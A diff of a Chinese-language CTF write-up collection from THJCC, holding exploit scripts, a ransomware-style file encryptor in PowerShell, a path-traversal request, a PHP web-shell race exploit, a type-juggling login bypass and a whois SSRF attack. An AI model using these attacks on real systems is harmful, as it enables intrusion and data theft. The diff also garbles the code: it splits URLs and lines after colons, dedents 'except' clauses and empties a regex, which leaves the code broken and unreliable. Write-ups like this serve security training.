@@ -14,35 +14,45 @@ if (-not (Test-Path -LiteralPath $InputFile -PathType Leaf)) {
   throw "找不到檔案：$InputFile"
 }
 
-$UnixTime = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds()
+$UnixTime = [DateTimeOffset]::
+UtcNow.ToUnixTimeSeconds()
 
 # key = MD5( UnixTimeSeconds as UTF-8 string ) -> 16 bytes (AES-128)
-$md5 = [System.Security.Cryptography.MD5]::Create()
+$md5 = [System.Security.Cryptography.MD5]::
+Create()
 try {
-$keyMaterial = [Text.Encoding]::UTF8.GetBytes([string]$UnixTime)
+$keyMaterial = [Text.Encoding]::
+UTF8.GetBytes([string]$UnixTime)
 $Key = $md5.ComputeHash($keyMaterial)
 } finally {
 $md5.Dispose()
 }
 
 # AES-CBC PKCS7
-$AES = [System.Security.Cryptography.Aes]::Create()
-$AES.Mode    = [System.Security.Cryptography.CipherMode]::CBC
-$AES.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
+$AES = [System.Security.Cryptography.Aes]::
+Create()
+$AES.Mode    = [System.Security.Cryptography.CipherMode]::
+CBC
+$AES.Padding = [System.Security.Cryptography.PaddingMode]::
+PKCS7
 $AES.Key     = $Key
 $AES.GenerateIV()
 
-$in  = [IO.File]::OpenRead($InputFile)
-$out = [IO.File]::Create($OutputFile)
+$in  = [IO.File]::
+OpenRead($InputFile)
+$out = [IO.File]::
+Create($OutputFile)
 
 try {
-$unixBytes = [BitConverter]::GetBytes([int64]$UnixTime)
+$unixBytes = [BitConverter]::
+GetBytes([int64]$UnixTime)
 $out.Write($unixBytes, 0, $unixBytes.Length)
 $out.Write($AES.IV, 0, $AES.IV.Length)
 
 $enc = $AES.CreateEncryptor()
 $crypto = New-Object System.Security.Cryptography.CryptoStream(
-    $out, $enc, [System.Security.Cryptography.CryptoStreamMode]::Write
+    $out, $enc, [System.Security.Cryptography.CryptoStreamMode]::
+Write
   )
   try {
     $in.CopyTo($crypto)
@@ -55,15 +65,11 @@ finally {
 $in.Dispose()
 $out.Dispose()
 $AES.Dispose()
-  [Array]::Clear($Key, 0, $Key.Length)
+  [Array]::
+Clear($Key, 0, $Key.Length)
 }
 
 Remove-Item -LiteralPath $InputFile -Force
-```
-
-
-
-```
 import hashlib
 import struct
 from Crypto.Cipher import AES
@@ -96,36 +102,18 @@ def decrypt_file(input_file, output_file):
 decrypt_file('flag.txt.lock', 'flag.txt')
 
 THJCC{L1nK_R4Ns0mWar3_😭😭😭😭}
-```
-
-
-
-```
 使用 office2john 提取 Excel 文件的加密哈希。如果在 WSL 中遇到 olefile 模块缺失报错，请先安装依赖：
 
 Bash
 sudo apt install python3-olefile
 python3 office2john.py readme.xlsx > readme_hash
-```
-
-
-
-```
 SSTV 解码
 编码是 Martin M1，使用 Robot36
-```
-
-
-
-```
-curl http://chal.thjcc.org:14514/?n=777 -X POST
+curl http://chal.thjcc.org:
+14514/?n=777 -X POST
 What a Lucky man! THJCC{LUcKy_sEVen_af41404df16be1ff}
-```
-
-
-
-```
-curl -i http://chal.thjcc.org:30000/download.php?file=../../../flag.txt
+curl -i http://chal.thjcc.org:
+30000/download.php?file=../../../flag.txt
 HTTP/1.1 200 OK
 Date: Fri, 27 Feb 2026 08:23:59 GMT
 Server: Apache/2.4.52 (Ubuntu)
@@ -134,11 +122,6 @@ Content-Length: 42
 Content-Type: application/octet-stream
 
 THJCC{h0w_dID_y0u_br34k_q'5_pr073c710n???}
-```
-
-
-
-```
 <?php
     error_reporting(0);
     $content = $_POST['content'];
@@ -164,11 +147,6 @@ THJCC{h0w_dID_y0u_br34k_q'5_pr073c710n???}
 
     highlight_file(__FILE__);
 ?>
-```
-
-
-
-```
 PHP 文件写入：
 
 php://filter 是 PHP 的一个流包装器，支持对文件内容进行编码或解码。
@@ -181,11 +159,6 @@ Web Shell 功能：
 
 写入的 Web Shell 文件包含以下代码：
 通过访问 Web Shell，可以直接读取 /flag.txt 的内容
-```
-
-
-
-```
 import re
 import threading
 import urllib.parse
@@ -230,7 +203,8 @@ class Exploit:
                     timeout=timeout,
                 )
                 print(f"Writer status: {response.status_code}")
-            except Exception as e:
+            
+except Exception as e:
                 print(f"Writer exception: {e}")
 
     def reader_loop(self, timeout: float = 0.5):
@@ -244,7 +218,8 @@ class Exploit:
                         self.flag = m.group(0)
                         self.stop_event.set()
                         return
-            except Exception as e:
+            
+except Exception as e:
                 print(f"Reader exception: {e}")
 
     def run(self, threads_writer: int = 3, threads_reader: int = 3):
@@ -274,11 +249,13 @@ class Exploit:
             )
             print(f"Triggered once, status: {r.status_code}")
             return r
-        except Exception as e:
+        
+except Exception as e:
             print(f"Trigger once exception: {e}")
 
 if __name__ == "__main__":
-    exp = Exploit("http://chal.thjcc.org:8080")
+    exp = Exploit("http://chal.thjcc.org:
+8080")
     flag = exp.run(threads_writer=3, threads_reader=3)
     print("[+] FLAG:", flag if flag else"Not found")
     
@@ -286,11 +263,6 @@ if __name__ == "__main__":
 Reader status: 404
 Reader status: 200
 [+] FLAG: THJCC{h4ppy_n3w_y34r_4nd_c0ngr47_u_byp4SS_th7_EXIT_n1ah4wg1n9198w4tqr8926g1n94e92gw65j1n89h21w921g9}
-```
-
-
-
-```
 校验逻辑：
 在 indexController.php 中，代码遍历 $_SESSION['perms'] 的键并检查是否等于 'admin'：
 
@@ -301,25 +273,16 @@ foreach ($_SESSION['perms'] as $key => $value) {
         break;
     }
 }
-```
-
-
-
-```
 利用点：
 在 PHP 中，弱比较 == 会触发“类型抖动”（Type Juggling）。当字符串 'admin' 与数字 0 进行比较时，PHP 会尝试将字符串转换为数字，结果 'admin' 会被转换为 0。因此，0 == 'admin' 表达式的结果为 true。
 
 绕过方法：
 虽然 login.php 禁止输入 'admin'，但它允许我们将用户输入直接作为 $_SESSION['perms'] 的键。如果你传入一个能让 PHP 在比较时产生冲突的值（如 0），即可触发逻辑绕过。
-```
-
-
-
-```
 import requests
 
 # 目标 URL
-url = "http://chal.thjcc.org:25601"
+url = "http://chal.thjcc.org:
+25601"
 login_url = f"{url}/login.php"
 index_url = f"{url}/index.php"
 
@@ -352,11 +315,6 @@ else:
     
 [+] 成功获取 Flag:
 THJCC{Meow_M3ow_Me0w}
-```
-
-
-
-```
 from flask import Flask, request, render_template_string
 import subprocess, shlex
 import pyotp
@@ -371,31 +329,24 @@ INDEX_HTML = """
   <meta charset="utf-8">
   <title>Whois 查詢</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <style>
-    body { font-family: monospace; margin: 2rem; }
-    form { margin-bottom: 1rem; }
-    input[type=text]{ width: 36rem; max-width: 100%; padding: .5rem; }
-    button{ padding: .5rem 1rem; }
-    pre { white-space: pre-wrap; word-wrap: break-word; background:#f4f4f4; padding:1rem; border-radius:.5rem; }
-    .argv{ color:#555; font-size:.9rem; }
-  </style>
+  
 </head>
-<body>
+
   <h1>Whois 查詢</h1>
   <form method="POST" action="/whois">
     <label>Domain name
-      <input name="domain" type="text" placeholder="example.com" required>
+      
     </label>
-    <button type="submit">查詢</button>
+    查詢
   </form>
   {% if result is not none %}
     <h2>結果</h2>
-    <pre>{{ result }}</pre>
+    {{ result }}
   {% elif error is not none %}
     <h2>錯誤</h2>
-    <pre>{{ error }}</pre>
+    {{ error }}
   {% endif %}
-</body>
+
 </html>
 """
 FLAG_VALUE = "THJCC{fake_flag_for_test}"
@@ -427,9 +378,11 @@ def whois_lookup():
     try:
         args = ["whois"] + shlex.split(raw)
         proc = subprocess.run(args, capture_output=True, text=True, timeout=15)
-    except subprocess.TimeoutExpired:
+    
+except subprocess.TimeoutExpired:
         return render_template_string(INDEX_HTML, result=None, error="查詢逾時", argv=" ".join(args)), 504
-    except Exception as e:
+    
+except Exception as e:
         return render_template_string(INDEX_HTML, result=None, error=str(e), argv=" ".join(args) if'args'in locals() else None), 500
 
     if proc.returncode != 0:
@@ -457,11 +410,6 @@ def flag():
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=13316)
-```
-
-
-
-```
 本题利用 whois 命令的 -h/-p 选项实现 SSRF，让服务器向自身发送精心构造的 HTTP 请求，同时通过解码硬编码的 TOTP 密钥生成验证码，绕过所有限制。核心知识点包括：
 
 SSRF 的利用方式（通过命令行工具）
@@ -471,11 +419,6 @@ TOTP 的工作原理及密钥硬编码风险
 简单 XOR 编码的逆向
 
 HTTP 请求的精确构造
-```
-
-
-
-```
 #!/usr/bin/env python3
 import requests
 import pyotp
@@ -503,7 +446,8 @@ def get_server_time(target_url):
             # 解析 HTTP 日期格式，如 'Wed, 28 Feb 2026 08:30:00 GMT'
             server_time = datetime.datetime.strptime(date_str, '%a, %d %b %Y %H:%M:%S %Z')
             return server_time.timestamp()
-    except:
+    
+except:
         pass
     # 若无法获取，返回本地时间（可能会有偏差）
     return time.time()
@@ -523,7 +467,8 @@ def build_payload(safekey, use_colon_format=False):
     content_length = len(body)
     http_request = (
         f"POST /flag HTTP/1.1rn"
-        f"Host: 127.0.0.1:13316rn"
+        f"Host: 127.0.0.1:
+13316rn"
         f"admin: thjccrn"
         f"Content-Type: application/x-www-form-urlencodedrn"
         f"Content-Length: {content_length}rn"
@@ -531,15 +476,17 @@ def build_payload(safekey, use_colon_format=False):
         f"{body}"
     )
     if use_colon_format:
-        # 使用 -h host:port 格式（某些 whois 版本支持）
-        payload = f'-h 127.0.0.1:13316 "{http_request}"'
+        # 使用 -h host:
+port 格式（某些 whois 版本支持）
+        payload = f'-h 127.0.0.1:
+13316 "{http_request}"'
     else:
         payload = f'-h 127.0.0.1 -p 13316 "{http_request}"'
     return payload
 
 def extract_flag_from_response(html):
-    """从返回的 HTML 的 <pre> 标签中提取 flag"""
-    pre_match = re.search(r'<pre>(.*?)</pre>', html, re.DOTALL)
+    """从返回的 HTML 的  标签中提取 flag"""
+    pre_match = re.search(r'(.*?)', html, re.DOTALL)
     if not pre_match:
         return None
     pre_content = pre_match.group(1)
@@ -562,7 +509,8 @@ def main(target_url):
 
         try:
             resp = requests.post(f"{target_url}/whois", data={"domain": payload}, timeout=10)
-        except Exception as e:
+        
+except Exception as e:
             print(f"[-] 请求失败: {e}")
             continue
 
@@ -575,22 +523,19 @@ def main(target_url):
             return
         else:
             print("[-] 未找到 flag，响应内容预览：")
-            print(resp.text[:500])  # 打印前500字符便于调试
+            print(resp.text[:
+500])  # 打印前500字符便于调试
 
     print("[-] 所有尝试失败")
 
 if __name__ == "__main__":
     if len(sys.argv) < 2:
         print(f"用法: {sys.argv[0]} <目标URL>")
-        print(f"示例: {sys.argv[0]} http://chal.thjcc.org:13316")
+        print(f"示例: {sys.argv[0]} http://chal.thjcc.org:
+13316")
         sys.exit(1)
     target = sys.argv[1].rstrip('/')
     main(target)
-```
-
-
-
-```
 1. 初始化密钥和加密数据
 2. 循环42次生成加密字符串
 3. 读取用户输入并比较
@@ -609,11 +554,6 @@ ciphertext = bytes.fromhex(
 flag = bytes(c ^ key[i % 15] for i, c in enumerate(ciphertext))
 print(flag.decode())  
 # THJCC{A_Simpl3_R3v3r3_using_CPP_d0ing_X0R}
-```
-
-
-
-```
 字节码由若干4字节指令组成（共411条）。每条指令格式为：[opcode, arg1, arg2, arg3]，其中 arg3 常作为立即数或索引。
 
 虚拟机使用4个32位寄存器（位于栈上 v11 处，通过 s[4*idx - 16] 访问），索引由 arg1 & 3 或 arg2 & 3 指定。
@@ -645,11 +585,6 @@ print(flag.decode())  
 其他：错误。
 
 执行流程从 v3 开始，每次处理4字节，直到遇到 0xA 或出错。
-```
-
-
-
-```
 __int64 __fastcall main(int a1, char **a2, char **a3)
 {
   _BYTE *v3; // rdi
@@ -753,11 +688,6 @@ LABEL_17:
   }
 return result;
 }
-```
-
-
-
-```
 import z3
 
 # 从题目中提取的加密数据（1644字节）
